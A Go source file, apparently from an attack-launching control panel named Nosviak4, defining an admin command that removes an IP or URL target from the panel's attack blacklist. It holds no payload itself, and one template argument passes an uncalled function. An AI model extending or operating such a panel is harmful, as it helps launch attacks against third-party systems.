package subcommands

import (
	"Nosviak4/source"
	"Nosviak4/source/database"
	"Nosviak4/source/masters/attacks"
	cmd "Nosviak4/source/masters/commands"
	"Nosviak4/source/masters/commands/commands"
	"Nosviak4/source/masters/sessions"
	"Nosviak4/source/masters/terminal/interactions"
)

// BlacklistRemove will consume the target and attempt to remove from the index
var BlacklistRemove = commands.Blacklists.NewCommand(&cmd.Command{
	Aliases: []string{"remove", "unblacklist"},
	Description: "delete from the blacklist",
	Permissions: []string{interactions.ADMIN},
	CommandFunc: func(ac *cmd.ArgContext, s *sessions.Session) error {
		target := attacks.NewTarget(ac.Args[0].Values[0].ToString(), &source.Method{IPAllowed: true, URLAllowed: true})
		if !target.Validate() {
			return s.ExecuteBranding(map[string]any{"target": ac.Args[0].Values[0].ToString()}, "commands", "blacklist", "invalid_target.tfx")
		}

		// tries to see if the target is blacklisted.
		blacklist, err := database.DB.GetBlacklistedTarget(ac.Args[0].Values[0].ToString())
		if err != nil || blacklist == nil {
			return s.ExecuteBranding(map[string]any{"target": ac.Args[0].Values[0].ToString}, "commands", "blacklist", "target_not_blacklisted.tfx")
		}

		if err := database.DB.RemoveBlacklist(blacklist.Target); err != nil {
			return s.ExecuteBranding(map[string]any{"err": err.Error()}, "commands", "blacklist", "error_occurred.tfx")
		}

		return s.ExecuteBranding(map[string]any{"target": blacklist.Target}, "commands", "blacklist", "blacklist_removed.tfx")
	},

	Args: []*cmd.Arg{
		{
			Name: "target",
			Type: cmd.STRING,
			Description: "target to remove from the index",
			Callback: func(ac *cmd.ArgContext, s *sessions.Session, i int) []string {
				blacklists, err := database.DB.GetBlacklistedTargets()
				if err != nil {
					return make([]string, 0)
				}

				buf := make([]string, 0)
				for _, blacklist := range blacklists {
					buf = append(buf, blacklist.Target)
				}

				return buf
			},
		},
	},
})